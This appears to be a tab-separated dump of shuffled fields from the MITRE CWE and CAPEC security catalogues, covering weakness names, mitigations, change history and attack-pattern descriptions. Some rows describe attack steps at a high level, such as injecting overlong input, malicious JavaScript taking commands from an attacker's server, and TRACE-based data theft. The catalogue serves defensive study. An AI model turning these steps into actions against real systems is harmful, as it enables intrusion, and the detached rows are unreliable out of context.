20231	100	The MITRE Corporation
5583	33	NIST
18782	30	Clancy Malcolm
7915	28	CWE Content Team
23136	102	ChildOf
22408	81	Availability
25368	95	[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.
22284	62	updated Potential_Mitigations, Time_of_Introduction
11162	39	2009-01-12
12049	28	CWE Content Team
13982	101	CAPEC Content Team
14095	35	MITRE
5820	46	This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.
7630	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
21878	88	Empty Exception Block
15461	35	MITRE
14648	35	MITRE
12618	28	CWE Content Team
7054	39	2015-12-07
20850	28	CWE Content Team
10283	40	Attacker has a mechanism to place its malicious libraries in the needed location on the file system.
16005	51	2015-11-09
25030	74	3
17055	104	426
12523	91	Testing
20288	39	2008-11-24
24019	39	2014-07-30
7649	28	CWE Content Team
23691	42	Where possible, perform human factors and usability studies to identify where your product's security mechanisms are difficult to use, and why.
15653	50	Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.
6568	35	MITRE
8995	54	Low
7015	39	2009-10-29
22560	39	2014-07-30
22123	31	699
16505	102	CanFollow
25088	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)
17181	76	2019-04-04
15821	39	2012-05-11
10617	97	Drop Encryption Level
14611	61	Draft
15304	28	CWE Content Team
20554	28	CWE Content Team
18730	61	Draft
12773	28	CWE Content Team
9737	39	2011-06-01
11512	21	CLASP
18056	31	699
7900	62	updated References
7747	39	2014-06-23
18956	39	2011-03-29
8093	62	updated Relationships, Taxonomy_Mappings
15998	92	Explore
20630	55	CAPEC Content Team
19009	31	699
17729	100	The MITRE Corporation
21650	42	Access control permissions should be set to prevent reading/writing of sensitive files inside/outside of the FTP directory.
10568	21	PLOVER
9519	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
12871	26	Operation
8554	79	Confidentiality
24188	39	2009-12-28
6673	77	Architecture or Design Review
20167	26	Implementation
9816	28	CWE Content Team
6636	60	23
15803	56	ChildOf
24882	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
15675	62	updated Description, Enabling_Factors_for_Exploitation, Name, Other_Notes, Theoretical_Notes
13693	35	MITRE
25226	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
8858	66	SSRF bible. Cheatsheet
10867	69	Draft
20045	97	WiFi SSID Tracking
17679	28	CWE Content Team
15422	39	2008-07-01
6516	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
23157	21	PLOVER
24536	39	2008-09-08
11106	35	MITRE
10707	35	MITRE
7506	35	Cigital
7064	39	2014-07-30
14142	25	Medium
11466	40	An adversary must have physical access to the dumpster or downstream processing facility.
6438	55	CAPEC Content Team
6697	57	Primary
18046	26	Architecture and Design
19123	23	An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.
19149	39	2012-05-11
19259	39	2012-05-11
7564	81	Availability
23365	79	Non-Repudiation
16972	39	2014-07-30
19785	94	Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
6066	79	Authorization
22140	23	This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.
12832	62	updated Time_of_Introduction
19665	57	Indirect
20511	67	Low
12608	39	2014-07-30
17544	80	The attacker may write a script to defeat the input filtering mechanism.
23718	103	Primary
16094	80	The attacker may need to continuously monitor a stream of signed data, waiting for an exploitable message to appear.
17737	28	CWE Content Team
14110	35	MITRE
7099	39	2017-11-08
19710	51	2018-07-31
7761	104	402
17303	26	Architecture and Design
9228	104	377
13399	76	2018-07-31
24393	28	CWE Content Team
5809	39	2008-09-08
22682	63	Read Files or Directories
11348	61	Draft
10519	62	updated Relationships
7031	33	Shaun Clowes
11460	35	MITRE
12651	31	1000
11229	63	Quality Degradation
20129	39	2014-07-30
18240	39	2011-06-01
16640	62	updated Description, Potential_Mitigations
21738	28	CWE Content Team
7520	48	01
14128	103	Primary
7820	69	Draft
10008	39	2008-07-01
18499	72	An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.
5973	28	CWE Content Team
7174	28	CWE Content Team
22826	28	CWE Content Team
6958	28	CWE Content Team
8457	88	Compiler Removal of Code to Clear Buffers
23183	23	The software does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the software to transmit more traffic than should be allowed for that actor.
6852	35	MITRE
20976	72	an attacker can write out the class to a byte stream, then extract the important data from it.
23915	54	High
5858	31	1000
13071	69	Draft
12202	61	Stable
5816	35	MITRE
19892	62	updated Common_Consequences
17202	28	CWE Content Team
15393	28	CWE Content Team
8340	50	Properly restrict the location of the software being used.
16216	28	CWE Content Team
14802	101	CAPEC Content Team
12302	62	updated References, Relationships, Taxonomy_Mappings
13626	101	CAPEC Content Team
6191	35	MITRE
19108	62	updated Relationships
7169	51	2017-04-15
6879	39	2013-07-17
11188	79	Confidentiality
18290	76	2019-09-30
11864	81	Other
6178	91	Implementation
11385	35	MITRE
12898	81	Other
20689	69	Incomplete
23444	69	Incomplete
20477	23	An adversary registers a domain name one bit different than a trusted domain. A BitSquatting attack leverages random errors in memory to direct Internet traffic to adversary-controlled destinations. BitSquatting requires no exploitation or complicated reverse engineering, and is operating system and architecture agnostic. Experimental observations show that BitSquatting popular websites could redirect non-trivial amounts of Internet traffic to a malicious entity.
8196	35	MITRE
7643	56	CanPrecede
7904	42	When the file being altered is owned by the current user and group, set the effective gid and uid to that of the current user and group when executing this statement.
17700	35	MITRE
9626	50	Properly restrict the location of the software being used.
24381	72	The integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.
6578	62	updated Relationships
13826	28	Sean Eidemiller
20932	56	ChildOf
8577	51	2014-06-23
17723	78	High
7583	88	Improper Handling of Unicode Encoding
20379	90	Java
15771	31	1000
18012	94	Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.
5721	31	1000
12850	28	CWE Content Team
25117	39	2011-06-01
17411	33	Danilo Bruschi
25034	56	ChildOf
5916	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8701	62	updated Common_Consequences
18866	81	Integrity
9184	56	ChildOf
9394	79	Authorization
16501	39	2014-07-30
7238	62	updated Potential_Mitigations, Time_of_Introduction
21903	39	2008-07-01
11489	100	The MITRE Corporation
19472	101	CAPEC Content Team
12131	56	ChildOf
11465	62	updated Common_Consequences, Description
24239	91	System Configuration
22244	103	Primary
24908	88	Use of NullPointerException Catch to Detect NULL Pointer Dereference
18249	35	MITRE
9214	35	MITRE
18957	35	MITRE
11496	35	MITRE
15224	104	672
11189	35	MITRE
22290	62	updated Relationships, Observed_Example, Other_Notes, Weakness_Ordinalities
21487	104	554
19124	26	Implementation
23337	28	CWE Content Team
13447	54	High
10550	103	Primary
16844	56	ChildOf
13824	39	2011-06-27
22010	35	MITRE
24259	39	2009-12-28
14840	92	Explore
8366	101	CAPEC Content Team
12164	79	Availability
23435	77	Automated Static Analysis - Source Code
22227	79	Confidentiality
25392	62	updated Potential_Mitigations, References, Relationships
24285	39	2019-09-19
15859	48	03
6508	35	MITRE
21481	35	MITRE
24973	35	MITRE
20419	39	2011-06-27
16737	28	CWE Content Team
24603	45	Class
8995	61	Draft
9041	63	Modify Application Data
11683	35	MITRE
24940	43	Simple
19466	35	MITRE
17633	62	updated Potential_Mitigations
25370	62	updated Description, Name
20968	101	CAPEC Content Team
16237	62	updated Common_Consequences, Demonstrative_Examples, Description, Relationships
16257	90	Language-Independent
19289	91	Architecture and Design
8821	103	Primary
22401	62	updated Time_of_Introduction
10556	97	Influence Perception of Consensus or Social Proof
24370	100	The MITRE Corporation
19599	56	ChildOf
13811	49	2010
24011	42	Most SSL_CTX functions have SSL counterparts that act on SSL-type objects.
15037	93	Defense in Depth
12113	28	CWE Content Team
25415	59	Updated Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Severity
17497	62	updated Alternate_Terms, Relationships
7887	28	CWE Content Team
14597	39	2012-05-11
13932	28	CWE Content Team
19575	103	Primary
14856	76	2017-08-04
9228	69	Incomplete
10593	62	updated Relationships, Taxonomy_Mappings
8906	50	Limit privileges of user accounts so new service creation can only be performed by authorized administrators.
5960	59	Updated Activation_Zone, Alternate_Terms, Architectural_Paradigms, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Examples-Instances, Frameworks, Injection_Vector, Languages, Payload, Payload_Activation_Impact, Platforms, Purposes, References, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Relevant_Security_Requirements, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity
21435	76	2017-05-01
12357	88	Improper Verification of Cryptographic Signature
14555	101	CAPEC Content Team
12049	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
11380	39	2008-10-14
19845	62	updated Relationships, Taxonomy_Mappings
16988	28	Eric Dalci
12184	61	Draft
11158	39	2011-03-29
14122	47	Gain Privileges
11463	28	CWE Content Team
15752	101	CAPEC Content Team
7088	42	When designing a function, make sure you return a value or throw an exception in case of an error.
21989	62	updated Applicable_Platforms, Description, Name, Potential_Mitigations, Relationships, Taxonomy_Mappings
19248	31	1000
18503	81	Confidentiality
14124	104	74
6889	62	updated Related_Attack_Patterns
15766	86	http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html
24085	62	updated Demonstrative_Examples
16031	56	ChildOf
12595	104	424
21211	69	Incomplete
21511	81	Integrity
8704	28	CWE Content Team
14000	62	updated References, Taxonomy_Mappings
21040	35	MITRE
22799	39	2008-07-01
23504	39	2011-09-13
14134	56	ChildOf
16799	102	ChildOf
20094	33	Guillaume Ross
13866	77	Dynamic Analysis with Manual Results Interpretation
11364	28	CWE Content Team
10789	48	07
17559	59	Updated References
12510	28	CWE Content Team
15607	62	updated Potential_Mitigations, Time_of_Introduction
14829	48	03
18559	67	High
23874	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies                            Generated Code Inspection
14439	103	Primary
22824	35	MITRE
9821	48	02
14990	46	Inner classes quietly introduce several security concerns because of the way they are translated into Java bytecode. In Java source code, it appears that an inner class can be declared to be accessible only by the enclosing class, but Java bytecode has no concept of an inner class, so the compiler must transform an inner class declaration into a peer class with package level access to the original outer class. More insidiously, since an inner class can access private fields in their enclosing class, once an inner class becomes a peer class in bytecode, the compiler converts private fields accessed by the inner class into protected fields.
24198	62	updated Relationships, Taxonomy_Mappings
19429	28	Eric Dalci
10752	62	updated Demonstrative_Examples, Observed_Examples, Relationships
17005	35	MITRE
10091	73	While using an application/system, the attacker discovers an input where validation is stopping him/her from performing some malicious or unauthorized actions.
19243	73	Log in to the legitimate site using another user's supplied credentials
15887	28	CWE Content Team
12233	97	Parameter Injection
14310	43	Simple
19123	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
16718	39	2017-11-08
23584	35	Cigital
11304	35	MITRE
10035	39	2017-11-08
15172	28	CWE Content Team
19316	42	Follow the principle of least privilege when assigning access rights to entities in a software system.
14450	28	CWE Content Team
8867	39	2008-09-08
14430	81	Confidentiality
10454	42	Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot.
22532	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
21916	88	Improper Cross-boundary Removal of Sensitive Data
6643	59	Updated Related_Attack_Patterns
12829	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18488	62	updated Detection_Factors
5693	62	updated Relationships, Taxonomy_Mappings
18617	23	An attacker searches a targeted web site for web pages that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging pages, or otherwise predictable pages within the site tree. For example, if an attacker might be able to notice a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked. Using this, the attacker may be able to gain access to information that the targeted site did not intend to make public.
20146	39	2017-05-03
8621	62	updated Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities
17141	28	CWE Content Team
20684	39	2009-12-28
16370	45	Base
16451	39	2012-10-30
7291	39	2018-03-27
15185	28	CWE Content Team
15832	77	Automated Static Analysis - Source Code
11241	62	updated Common_Consequences
8835	31	699
18236	59	Updated @Abstraction
16822	40	This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send TCP packets of arbitrary size with crafted data.
20477	97	BitSquatting
11016	28	CWE Content Team
15332	62	updated Relationships
19013	100	The MITRE Corporation
19053	73	The attacker leverages file search path order issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-38.
18096	46	This issue can prevent the software from running reliably, since the child might not perform essential destruction operations.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).
19946	39	2009-10-29
12100	47	Execute Unauthorized Commands
18089	62	updated References
20295	43	Simple
14699	101	CAPEC Content Team
8419	35	Cigital
14974	49	2005
22720	80	Ability to create iFrame and JavaScript code that would initiate unauthorized requests to sensitive sites from the victim's browser
7397	28	CWE Content Team
5952	56	ChildOf
7814	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Relevant_Properties, Type
11867	39	2013-02-21
23027	104	1121
14138	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
11821	77	Other
12304	73	Attacker manually crawls application to identify file inputs
9977	62	updated Common_Consequences
24427	50	If you have to use dangerous functions, make sure that you do boundary checking.
18831	56	PeerOf
14002	89	Detailed
16044	35	MITRE
9729	91	Architecture and Design
25055	103	Primary
13070	73	Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.
18052	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, References, Relationships
22040	61	Draft
13295	47	Resource Consumption
10379	100	The MITRE Corporation
16423	63	DoS: Instability
6337	69	Draft
19638	28	CWE Content Team
13879	81	Access Control
16041	47	Other
10101	35	MITRE
13305	47	Other
18811	61	Draft
13509	63	Bypass Protection Mechanism
9708	39	2014-07-30
20798	39	2017-11-08
14190	86	http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
25122	47	Execute Unauthorized Commands
12580	50	Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.
22422	85	544
23632	81	Other
16989	28	Eric Dalci
13926	62	updated Demonstrative_Examples
6611	62	updated Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, References, Relationships
10560	21	PLOVER
24609	78	Medium
16589	78	Low
21078	100	The MITRE Corporation
21670	39	2014-02-18
20888	68	This makes it easier to spot places in the code where data is being used that is unencrypted.
14458	35	MITRE
19091	28	CWE Content Team
24318	21	PLOVER
10191	103	Primary
16800	28	CWE Content Team
22416	95	The adversary injects the content into the targeted software.
16421	44	Moderate
11198	35	MITRE
23174	103	Primary
9333	28	CWE Content Team
17233	39	2008-07-01
22142	97	Cellular Broadcast Message Request
9604	79	Authorization
8813	92	Experiment
15733	62	updated Potential_Mitigations
7614	23	An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.
14812	47	Read Data
12200	39	2012-05-11
16049	103	Primary
14561	51	2014-06-23
24890	56	ChildOf
22697	72	If an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables.
8450	101	CAPEC Content Team
14018	35	Cigital
13955	28	CWE Content Team
10599	31	699
21245	47	Modify Data
9523	54	High
19187	26	Architecture and Design
18564	49	2012
16243	91	System Configuration
12482	46	Many languages offer powerful features that allow the programmer to dynamically create or modify existing code, or resources used by code such as variables and objects. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can directly influence these code resources in unexpected ways.
19327	62	updated Taxonomy_Mappings
15891	62	updated Potential_Mitigations
20948	28	CWE Content Team
23875	35	MITRE
23412	28	CWE Content Team
21751	28	Sean Eidemiller
23673	39	2008-09-08
18171	102	ChildOf
7162	27	Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.                A tool capable of sending and receiving packets from a remote system.
9565	42	When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.                   For example, US government systems require FIPS 140-2 certification.                   Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.                   Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]
14492	81	Integrity
15692	104	599
8166	59	Updated Related_Attack_Patterns
18810	35	MITRE
20546	62	updated Time_of_Introduction
24402	31	1000
10187	28	CWE Content Team
9014	39	2011-06-27
8247	91	Testing
16057	23	Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).
18221	76	2018-07-31
18587	43	Simple
23566	35	MITRE
5734	31	699
13445	45	Base
24124	67	Low
6929	67	Medium
25005	43	Simple
10291	31	1000
6751	62	updated Common_Consequences
16763	31	699
24352	25	Low
20331	56	ChildOf
20191	91	Implementation
20692	95	[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions
16599	35	MITRE
25174	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
20703	39	2008-09-08
8863	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
20185	63	Read Memory
14978	103	Primary
10011	104	324
14438	31	1000
22146	79	Access Control
13765	35	MITRE
22319	28	CWE Content Team
20119	104	786
20473	28	CWE Content Team
9178	35	MITRE
23475	33	Arshan Dabirsiaghi
6227	63	DoS: Resource Consumption (CPU)
22745	39	2010-12-13
22276	72	If a negative value is used to access memory, buffers, or other indexable structures, it could access memory outside the bounds of the buffer.
6411	35	KDM Analytics
18226	95	[Create a malicious script that pings the web server with HTTP TRACE request] Create a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.
16121	81	Confidentiality
14496	51	2014-06-23
23503	44	High
19038	88	Parent Class with References to Child Class
6167	62	updated Potential_Mitigations
13831	72	Excessive looping will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond. If limited resources such as memory are consumed for each iteration, the loop may eventually cause a crash or program exit due to exhaustion of resources, such as an out-of-memory error.
11804	62	updated Description
20268	35	MITRE
8025	102	ChildOf
7077	35	MITRE
25010	53	The MITRE Corporation
25058	35	MITRE
7277	58	Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function.
11487	81	Integrity
10885	102	ChildOf
18954	95	[Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.
20611	94	The jamming of equipment denies the availability of functioning communications services.
22541	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as value delimiters when they are sent to a downstream component.
20283	31	699
16367	104	654
13990	42	Use languages, libraries, or frameworks that make it easier to handle numbers without unexpected consequences.                   Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++).
18432	78	Medium
17019	39	2009-07-27
6720	35	MITRE
19560	36	http://blog.watchfire.com/FPI.pdf
15950	31	1000
16628	28	CWE Content Team
11743	31	699
22653	62	updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
13012	39	2010-06-21
15111	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8400	28	CWE Content Team
24630	31	699
7647	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15191	91	Implementation
12143	28	CWE Content Team
25399	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20264	39	2017-11-08
21973	39	2011-06-27
16288	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
8838	100	The MITRE Corporation
12166	28	CWE Content Team
15224	105	Mobile
16622	39	2014-07-30
13349	45	Variant
17381	39	2012-05-11
16379	50	Validate the received messages against the WSDL Schema. Incomplete solution.
9375	28	CWE Content Team
21818	56	ChildOf
23042	89	Standard
7366	23	If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.
8811	91	Implementation
15466	28	CWE Content Team
15946	28	CWE Content Team
19861	28	CWE Content Team
25439	91	Architecture and Design
7531	77	Black Box
20882	87	Database Server
22711	39	2017-11-08
19572	35	MITRE
8977	39	2012-05-11
11795	49	2018
18350	43	Simple
18408	103	Primary
16469	62	updated Potential_Mitigations
16044	39	2014-07-30
23938	90	ASP.NET
15306	81	Integrity
23362	28	CWE Content Team
7566	47	Read Data
17254	33	Rami Jaamour
12346	39	2010-12-13
16670	91	Architecture and Design
20725	42	Understand, and properly implement all checks necessary to ensure the integrity of certificate trust integrity.
24197	88	ASP.NET Misconfiguration: Use of Identity Impersonation
15705	28	CWE Content Team
16682	63	DoS: Crash, Exit, or Restart
24246	76	2018-07-31
21167	72	A user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts.
17606	56	ChildOf
19398	39	2010-12-13
6379	74	4
7936	28	CWE Content Team
16055	47	Execute Unauthorized Commands
8112	31	699
8376	81	Other
13003	101	CAPEC Content Team
10188	101	CAPEC Content Team
17868	69	Incomplete
10137	28	CWE Content Team
12869	88	Incorrect Default Permissions
18926	47	Read Data
8923	28	CWE Content Team
10567	35	Cigital
6450	62	updated Demonstrative_Examples, Description
14393	35	Cigital
20763	35	MITRE
16524	28	CWE Content Team
22959	73	Determine whether URL encoding is accepted by the application/system.
14914	39	2010-02-16
22688	39	2008-07-01
18209	31	1000
20362	35	MITRE
23089	35	MITRE
13603	103	Primary
19827	31	1000
12900	39	2011-03-29
13468	62	updated Relationships, Taxonomy_Mappings
13071	45	Variant
5838	88	J2EE Bad Practices: Direct Management of Connections
17749	51	2014-06-23
13725	54	High
6167	28	CWE Content Team
23984	28	CWE Content Team
16407	63	DoS: Crash, Exit, or Restart
8037	63	Modify Memory
6127	62	updated Relationships
20750	28	CWE Content Team
9426	28	CWE Content Team
11380	35	MITRE
7469	72	Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash.
17648	62	updated Relationships
6148	23	The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.
6838	93	Defense in Depth
18739	101	CAPEC Content Team
7132	79	Access Control
13717	51	2014-06-23
11592	39	2012-10-30
20516	60	08
7011	62	updated Common_Consequences
22400	62	updated Relationships
22196	49	2015
21172	54	Low
9437	103	Primary
21714	59	Updated Related_Attack_Patterns, Related_Weaknesses
20109	28	CWE Content Team
11782	81	Confidentiality
24361	35	MITRE
11299	43	Simple
17075	21	PLOVER
7978	88	Declaration of Catch for Generic Exception
5905	28	CWE Content Team
15267	62	updated White_Box_Definitions
9027	27	None: No specialized resources are required to execute this type of attack.
24887	62	updated Common_Consequences
22020	39	2009-03-10
17098	42	Protect include files from being exposed.
19857	26	Implementation
10909	39	2014-07-30
16036	102	ChildOf
9439	62	updated Relationships, Taxonomy_Mappings
16884	39	2008-09-08
14661	28	CWE Content Team
10366	42	Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.
8978	59	Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required
13770	69	Incomplete
22045	39	2008-09-08
16717	62	updated Potential_Mitigations
14631	35	MITRE
19992	28	CWE Content Team
14475	35	MITRE
15906	39	2014-07-30
24180	54	High
6232	56	ChildOf
8023	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
21831	35	MITRE
15776	89	Detailed
15229	39	2017-11-08
13254	39	2008-07-01
12017	62	updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations, References, Relationships
19447	81	Confidentiality
19559	91	Implementation
18745	35	MITRE
13630	28	CWE Content Team
6205	55	CAPEC Content Team
18070	62	updated Demonstrative_Examples
19070	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as macro symbols when they are sent to a downstream component.
7370	42	Invalidate any existing session identifiers prior to authorizing a new user session.
6240	56	ChildOf
18385	31	699
17809	101	CAPEC Content Team
18967	91	Architecture and Design
18352	28	CWE Content Team
12789	103	Primary
5929	28	CWE Content Team
20917	63	Read Application Data
18170	28	CWE Content Team
21919	28	CWE Content Team
16402	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18884	35	MITRE
25072	80	Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must.
8400	62	updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
6304	56	ChildOf
24051	56	PeerOf
10079	103	Primary
24308	100	The MITRE Corporation
6460	101	CAPEC Content Team
22876	35	MITRE
7725	39	2008-09-08
12396	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
21145	47	Gain Privileges
17464	73	An attacker makes authorized connections and records the session tokens or credentials.
9798	56	ChildOf
14353	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References
24063	39	2012-10-30
17608	28	CWE Content Team
7656	28	CWE Content Team
25402	23	The software does not properly distinguish between different types of elements in a way that leads to insecure behavior.
10964	32	University of California, Berkeley
22393	57	Indirect
12298	53	The MITRE Corporation
5853	39	2017-11-08
15066	55	CAPEC Content Team
22441	91	Architecture and Design
